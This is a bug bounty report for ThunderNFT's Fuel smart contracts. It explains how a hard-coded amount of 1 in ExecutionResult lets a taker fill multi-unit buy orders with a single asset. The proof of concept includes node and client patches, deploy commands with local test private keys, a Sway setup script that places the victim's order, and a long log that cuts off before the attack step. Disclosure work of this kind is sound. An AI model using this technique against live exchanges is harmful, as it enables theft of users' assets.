# IOP \_ ThunderNFT 34958 - \[Smart Contract - Critical] Incorrect Setting of Amount in ExecutionResult

Submitted on Sun Sep 01 2024 20:25:53 GMT-0400 (Atlantic Standard Time) by @anatomist for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34958

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/libraries>

Impacts:

* Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties

## Description

## Brief/Intro

The `ExecutionResult` in the libraries incorrectly sets the amount to a constant value of 1 in the `s1` function. If a victim places a buy-side order with an amount greater than 1, the order is placed successfully. However, after execution, the amount is incorrectly changed to 1, allowing the attacker to fulfill the order with only 1 asset, resulting in a loss for the victim.

## Vulnerability Details

When Thunder Exchange executes an sell-side taker order, it receives the execution result from `strategy.execute_order(order)`. This function finds the matched order and [generates the execution result](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/execution_strategies/strategy_fixed_price_sale/src/main.sw#L146). During this process, several checks are performed, but the amount is not properly validated. Instead, [the amount is set to a constant value of 1](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/libraries/src/execution_result.sw#L31), regardless of the original order's amount. When Thunder Exchange receives the execution result, it checks if the asset and amount provided by the taker [match those in the execution result](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L404), which incorrectly shows an amount of 1. This allows the taker to fulfill the order with just 1 corresponding asset, disregarding the original order's amount.

A prerequisite for this attack is that victim must placed a buy-side order with amount greater than 1. In Fuel, NFTs differ from those in Ethereum as they are native assets, blurring the boundary between NFTs and fungible tokens (FTs). This ambiguity makes it plausible that users might use this protocol to sell FTs. Furthermore, fractional NFTs exist in Ethereum, so we can't strongly assert that there is only one NFT for each asset (contract, token\_id pair). Therefore, this scenario is highly likely to occur.

## Impact Details

An attacker can take any buy-side order by providing only 1 asset, even if the original order required a larger quantity. This results in the victim not receiving the expected amount of assets they ordered.

## References

<https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/libraries/src/execution\\_result.sw#L31> <https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/execution\\_strategies/strategy\\_fixed\\_price\\_sale/src/main.sw#L146> <https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder\\_exchange/src/main.sw#L404>

## Proof of concept

## POC

This PoC demonstrates a scenario where a victim places a buy-side order with a price of 10, demanding 10 base assets, which should typically result in no loss and no profit for the victim. However, as shown in this PoC, an attacker can take this order by providing only 1 base asset, causing the victim to lose 9 base assets.

### Prerequisite

To demonstrate the impact, we need to set up two accounts: an admin account, which will set up the Thunder Exchange contract and also act as the victim placing an order, and an attacker account, which will later take the order with less asset amount than required by the victim.

**Attacker Account**

* Account(fuel): fuel16r69m48pwg4c8dtlnpze2m95t2fws4vwdju7w7sm9ztj459c0ekqs6xjg5
* Account: 0xd0f45dd4e1722b83b57f9845956cb45a92e8558e6cb9e77a1b28972ad0b87e6c
* Private Key: 306a75f0093834948e363ece5ba1b5a7eaad99f2fc9ab976ba01c2dbea3320f6

**Admin Account**

* Account(fuel): fuel1gq9fak7588gs0hk8yuun95hpmaahldy6204h2v37945kazug46mqz682vm
* Account: 0x400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6
* Private Key: a710552d8d29a0f7aefcb412399fbb041a31ae155cb0eb95d370bf8f99f0409f

### Local Node Setup

> This PoC uses commit `a9e5e89f5fb38e3b3d6e6bdfe1ad339a01f2f3b9` of Fuel-Core.

Modify `state_config.json` to allocate initial funds to the above two accounts:

```diff
diff --git a/bin/fuel-core/chainspec/local-testnet/state_config.json b/bin/fuel-core/chainspec/local-testnet/state_config.json
index b0f3e1c85..ec9961ab6 100644
--- a/bin/fuel-core/chainspec/local-testnet/state_config.json
+++ b/bin/fuel-core/chainspec/local-testnet/state_config.json
@@ -5,7 +5,7 @@
       "output_index": 0,
       "tx_pointer_block_height": 0,
       "tx_pointer_tx_idx": 0,
-      "owner": "6b63804cfbf9856e68e5b6e7aef238dc8311ec55bec04df774003a2c96e0418e",
+      "owner": "0xd0f45dd4e1722b83b57f9845956cb45a92e8558e6cb9e77a1b28972ad0b87e6c",
       "amount": 1152921504606846976,
       "asset_id": "f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07"
     },
@@ -14,7 +14,7 @@
       "output_index": 0,
       "tx_pointer_block_height": 0,
       "tx_pointer_tx_idx": 0,
-      "owner": "54944e5b8189827e470e5a8bacfc6c3667397dc4e1eef7ef3519d16d6d6c6610",
+      "owner": "0x400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6",
       "amount": 1152921504606846976,
       "asset_id": "f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07"
     },
```

After building the local node with `cargo build --release`, run the node with:

```
./target/release/fuel-core run --db-type in-memory --poa-instant true --debug --snapshot ./bin/fuel-core/chainspec/local-testnet/
```

### Client Patch

> This PoC uses commit `efda0397c7bee77de73bd726ec0b732d57614973` of Sway.

I used the `forc-run` client to deploy the contract and run the PoC script. Since adding an output address directly isn't straightforward, I patched the client as follows:

```diff
diff --git a/forc-plugins/forc-client/src/op/run/mod.rs b/forc-plugins/forc-client/src/op/run/mod.rs
index 49047de3a..f6a0e30ba 100644
--- a/forc-plugins/forc-client/src/op/run/mod.rs
+++ b/forc-plugins/forc-client/src/op/run/mod.rs
@@ -119,7 +119,12 @@ pub async fn run_pkg(

     let mut tb = TransactionBuilder::script(compiled.bytecode.bytes.clone(), script_data);
     tb.maturity(command.maturity.maturity.into())
-        .add_contracts(contract_ids);
+        .add_contracts(contract_ids)
+        .add_output(fuel_tx::Output::variable(fuel_tx::Address::zeroed(), 0, fuel_tx::AssetId::BASE))
+        .add_output(fuel_tx::Output::variable(fuel_tx::Address::zeroed(), 0, fuel_tx::AssetId::BASE))
+        .add_output(fuel_tx::Output::variable(fuel_tx::Address::zeroed(), 0, fuel_tx::AssetId::BASE))
+        .add_output(fuel_tx::Output::variable(fuel_tx::Address::zeroed(), 0, fuel_tx::AssetId::BASE))
+        .add_output(fuel_tx::Output::variable(fuel_tx::Address::zeroed(), 0, fuel_tx::AssetId::BASE));

     let provider = Provider::connect(node_url.clone()).await?;
```

### Deploying Thunder Exchange Contract

Use the admin account to deploy all the contracts listed below and retrieve their respective contract addresses.

Run the following command in each contract's directory to deploy the contracts:

```
./target/release/forc-deploy a710552d8d29a0f7aefcb412399fbb041a31ae155cb0eb95d370bf8f99f0409f 
```

Here's an example output for subsequent reference:

```bash
thunder_exchange: 	0xa39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08
asset_manager: 		0xb2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec
execution_manager: 	0x380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02
royalty_manager: 	0xe7d76b39fecc40866346e0415467e392ebfd7e4f2c45133ea9703db759a4d221
pool: 				0xd3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488
fixed_strategy: 	0xf6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a
```

### Setup Script

This script sets up the Thunder Exchange protocol using the admin's account, and also the admin acount will act as victim account, who place a buy-side order to buy 10 base asset with price 10.

> The collection (`0x7e2becd64cd598da59b4d1064b711661898656c6b1f4918a787156b8965dc83c`) and `token_id` (0) correspond to the default base asset (`f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07`).

> Note that the deployed contract addresses are hardcoded in the main function; you will need to change these to your own deployed contract addresses.

Forc.toml

```toml
[project]
authors = ["anatomist"]
entry = "main.sw"
license = "Apache-2.0"
name = "POC_Setup"

[dependencies]
interfaces = {path = "../interfaces"}
libraries = {path = "../libraries"}
```

src/main.sw

```rust
script;
 
use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
    royalty_manager_interface::*,
    asset_manager_interface::*,
    execution_manager_interface::ExecutionManager,
    execution_strategy_interface::*,
    pool_interface::Pool,
};

use libraries::{
    msg_sender_address::*,
    constants::*,
    order_types::*,
    ownable::*,
};

use std::{
    block::timestamp,
    auth::*,
    call_frames::*,
    context::*,
    contract_id::ContractId,
    logging::log,
    revert::require,
    storage::storage_map::*,
    asset::*
};

fn initialize(
    thunder_exchange: ContractId,
    asset_manager: ContractId,
    execution_manager: ContractId,
    royalty_manager: ContractId,
    fixed_strategy: ContractId,
    pool: ContractId,
) {

    let thunder_exchange_abi = abi(ThunderExchange, thunder_exchange.into());
    thunder_exchange_abi.initialize();
    thunder_exchange_abi.set_asset_manager(asset_manager);
    thunder_exchange_abi.set_execution_manager(execution_manager);
    thunder_exchange_abi.set_royalty_manager(royalty_manager);
    thunder_exchange_abi.set_pool(pool);

    let asset_manager_abi = abi(AssetManager, asset_manager.into());
    asset_manager_abi.initialize();
    asset_manager_abi.add_asset(AssetId::base());

    let fixed_strategy_abi = abi(ExecutionStrategy, fixed_strategy.into());
    fixed_strategy_abi.initialize(thunder_exchange);

    let execution_manager_abi = abi(ExecutionManager, execution_manager.into());
    execution_manager_abi.initialize();
    execution_manager_abi.add_strategy(fixed_strategy);

    let royalty_manager_abi = abi(RoyaltyManager, royalty_manager.into());
    royalty_manager_abi.initialize();

    let pool_abi = abi(Pool, pool.into());
    pool_abi.initialize(thunder_exchange, asset_manager);
}

fn place_order(
    thunder_exchange: ContractId,
){
    let thunder_exchange_abi = abi(ThunderExchange, thunder_exchange.into());
    let execute_manager = thunder_exchange_abi.get_execution_manager();
    let execute_manager_abi = abi(ExecutionManager, execute_manager.into());
    let fixed_strategy = execute_manager_abi.get_whitelisted_strategy(0).unwrap();

    let nonce = abi(ExecutionStrategy, fixed_strategy.into()).get_order_nonce_of_user(caller_address().unwrap(), Side::Sell) + 1;

    let mut maker_order_input: MakerOrderInput = MakerOrderInput {
        side: Side::Buy,
        maker: caller_address().unwrap(),
        collection: ContractId::from(0x7e2becd64cd598da59b4d1064b711661898656c6b1f4918a787156b8965dc83c),
        token_id: SubId::zero(),
        price: 10,
        amount: 10,
        nonce: nonce,
        strategy: fixed_strategy,
        payment_asset: AssetId::base(),
        expiration_range: 100,
        extra_params: ExtraParams {
            extra_address_param: Address::zero(),
            extra_contract_param: ContractId::zero(),
            extra_u64_param: 0,
        },
    };
    let pool = thunder_exchange_abi.get_pool();
    let pool_abi = abi(Pool, pool.into());
    pool_abi.deposit{asset_id: AssetId::base().into(), coins: 10}();
    thunder_exchange_abi.place_order(maker_order_input);
    log(maker_order_input.nonce);
    log(maker_order_input.maker);
}

fn main() {
    let thunder_exchange = ContractId::from(0xa39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08);
    let asset_manager = ContractId::from(0xb2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec);
    let execution_manager = ContractId::from(0x380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02);
    let royalty_manager = ContractId::from(0xe7d76b39fecc40866346e0415467e392ebfd7e4f2c45133ea9703db759a4d221);
    let pool = ContractId::from(0xd3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488);
    let fixed_strategy = ContractId::from(0xf6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a);       

    initialize(
        thunder_exchange,
        asset_manager,
        execution_manager,
        royalty_manager,
        fixed_strategy,
        pool,
    );

    place_order(
        thunder_exchange
    );
}
```

### Running Setup Script

Use the following command with the patched `forc-run` and the admin account's private key to execute the setup script.

> Note that we are using the contract addresses from the deployment output above.

```bash
./target/release/forc-run a710552d8d29a0f7aefcb412399fbb041a31ae155cb0eb95d370bf8f99f0409f \
 --script-gas-limit 10000000 --node-url http://localhost:4000/v1/graphql \
 --contract 0xa39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08 \
 --contract 0xb2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec \
 --contract 0x380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02 \
 --contract 0xe7d76b39fecc40866346e0415467e392ebfd7e4f2c45133ea9703db759a4d221 \
 --contract 0xd3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488 \
 --contract 0xf6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a 

```

Upon running the setup script, you should see an output similar to the following:

```json
[{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9974295,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42672,"param1":67107840,"param2":67106816,"pc":42672,"to":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"6aa290c45414c81f58f4afd98b3ac7a53c8b2f8efc8489c0fece14acaae36f07","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":42672,"len":40,"pc":55608,"ptr":67103232,"ra":0,"rb":9517900813706399297}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":42672,"len":0,"pc":55764,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9789534,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42888,"param1":67101696,"param2":67100672,"pc":42888,"to":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":42888,"len":0,"pc":58036,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9708151,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42888,"param1":67097600,"param2":67096576,"pc":42888,"to":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":42888,"len":0,"pc":58432,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9626349,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42888,"param1":67093504,"param2":67092480,"pc":42888,"to":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":42888,"len":0,"pc":60360,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9543542,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42888,"param1":67089408,"param2":67088384,"pc":42888,"to":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":42888,"len":0,"pc":59508,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9462864,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42672,"param1":67085312,"param2":67084288,"pc":42672,"to":"b2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"6aa290c45414c81f58f4afd98b3ac7a53c8b2f8efc8489c0fece14acaae36f07","id":"b2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec","is":42672,"len":40,"pc":63924,"ptr":67080704,"ra":0,"rb":9517900813706399297}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"b2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec","is":42672,"len":0,"pc":46332,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9352098,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42304,"param1":67079680,"param2":67078656,"pc":42304,"to":"b2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"b2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec","is":42304,"len":0,"pc":43572,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9201199,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42888,"param1":67074240,"param2":67073216,"pc":42888,"to":"f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"6aa290c45414c81f58f4afd98b3ac7a53c8b2f8efc8489c0fece14acaae36f07","id":"f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a","is":42888,"len":40,"pc":76424,"ptr":67069632,"ra":0,"rb":9517900813706399297}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a","is":42888,"len":0,"pc":48568,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9036420,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42672,"param1":67068096,"param2":67067072,"pc":42672,"to":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"6aa290c45414c81f58f4afd98b3ac7a53c8b2f8efc8489c0fece14acaae36f07","id":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02","is":42672,"len":40,"pc":64496,"ptr":67063488,"ra":0,"rb":9517900813706399297}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02","is":42672,"len":0,"pc":45240,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8925682,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42888,"param1":67062464,"param2":67061440,"pc":42888,"to":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02","is":42888,"len":0,"pc":44156,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8777074,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42672,"param1":67057024,"param2":67056000,"pc":42672,"to":"e7d76b39fecc40866346e0415467e392ebfd7e4f2c45133ea9703db759a4d221"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"6aa290c45414c81f58f4afd98b3ac7a53c8b2f8efc8489c0fece14acaae36f07","id":"e7d76b39fecc40866346e0415467e392ebfd7e4f2c45133ea9703db759a4d221","is":42672,"len":40,"pc":46192,"ptr":67052416,"ra":0,"rb":9517900813706399297}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"e7d76b39fecc40866346e0415467e392ebfd7e4f2c45133ea9703db759a4d221","is":42672,"len":0,"pc":46200,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8662820,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42304,"param1":67051392,"param2":67050368,"pc":42304,"to":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"6aa290c45414c81f58f4afd98b3ac7a53c8b2f8efc8489c0fece14acaae36f07","id":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","is":42304,"len":40,"pc":66068,"ptr":67046784,"ra":0,"rb":9517900813706399297}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","is":42304,"len":0,"pc":44228,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8446115,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42712,"param1":67044736,"param2":67043712,"pc":42712,"to":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08"}},{"ReturnData":{"data":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02","digest":"1bcb83b3a3c6b1a7794fc43d6603001e3cbff4ef28b21b95da4afa69d6b456f6","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":42712,"len":32,"pc":51852,"ptr":67041152}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8423532,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42304,"param1":67040128,"param2":67039104,"pc":42304,"to":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02"}},{"ReturnData":{"data":"0000000000000001f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a","digest":"652764e2359de65beaaf013fc72c00378962b6cf87d32683fdb67149b3a43149","id":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02","is":42304,"len":40,"pc":44744,"ptr":67036064}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8390477,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42304,"param1":67035040,"param2":67034016,"pc":42304,"to":"f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a"}},{"ReturnData":{"data":"0000000000000000","digest":"af5570f5a1810b7af78caf4bc70a660f0df51e42baf91d4de5b2328de0e83dfc","id":"f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a","is":42304,"len":8,"pc":47272,"ptr":67031456}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8358176,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42712,"param1":67030432,"param2":67029408,"pc":42712,"to":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08"}},{"ReturnData":{"data":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","digest":"e0e1c3cb6ff8c275f09cb923157aa4c8cdc1c6a91a3b852e29f340a577864c05","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":42712,"len":32,"pc":52880,"ptr":67026848}},{"Call":{"amount":10,"asset_id":"f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07","gas":8331233,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42672,"param1":67025824,"param2":67024800,"pc":42672,"to":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488"}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8310165,"id":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","is":81384,"param1":67022240,"param2":67021216,"pc":81384,"to":"b2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec"}},{"ReturnData":{"data":"01","digest":"4bf5122f344554c53bde2ebb8cd2b7e3d1600ad631c385a5d7cce23c7785459a","id":"b2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec","is":81384,"len":1,"pc":85576,"ptr":67018656}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07000000000000000a","digest":"6b07299acbf1d7245c01ea6af994a39d45a477c7dc61da6d2fdd96908a04fa55","id":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","is":42672,"len":80,"pc":64980,"ptr":67015954,"ra":0,"rb":12195664052085097644}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","is":42672,"len":0,"pc":43572,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8225807,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":42304,"param1":67014930,"param2":67013906,"pc":42304,"to":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08"}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8196434,"id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":123368,"param1":67010834,"param2":67009810,"pc":123368,"to":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02"}},{"ReturnData":{"data":"01","digest":"4bf5122f344554c53bde2ebb8cd2b7e3d1600ad631c385a5d7cce23c7785459a","id":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02","is":123368,"len":1,"pc":126464,"ptr":67007250}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8169907,"id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":123368,"param1":67005714,"param2":67004690,"pc":123368,"to":"b2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec"}},{"ReturnData":{"data":"01","digest":"4bf5122f344554c53bde2ebb8cd2b7e3d1600ad631c385a5d7cce23c7785459a","id":"b2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec","is":123368,"len":1,"pc":127560,"ptr":67002130}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8141596,"id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":122360,"param1":67000594,"param2":66999570,"pc":122360,"to":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488"}},{"ReturnData":{"data":"000000000000000a","digest":"8d85f8467240628a94819b26bee26e3a9b2804334c63482deacec8d64ab4e1e7","id":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","is":122360,"len":8,"pc":123124,"ptr":66996683}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":8110263,"id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":121928,"param1":66995659,"param2":66994635,"pc":121928,"to":"f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a"}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a","is":121928,"len":0,"pc":130012,"ptr":0}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb67e2becd64cd598da59b4d1064b711661898656c6b1f4918a787156b8965dc83c0000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000a0000000000000001f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2af8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad074000000066d4bd7b4000000066d4bddf000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000","digest":"8eb8a73668d048952b186cf5ad576ab006c23f65c605d3b53e70da08d791d696","id":"a39046092ba23b6340405f2a62c0632c241a1e8a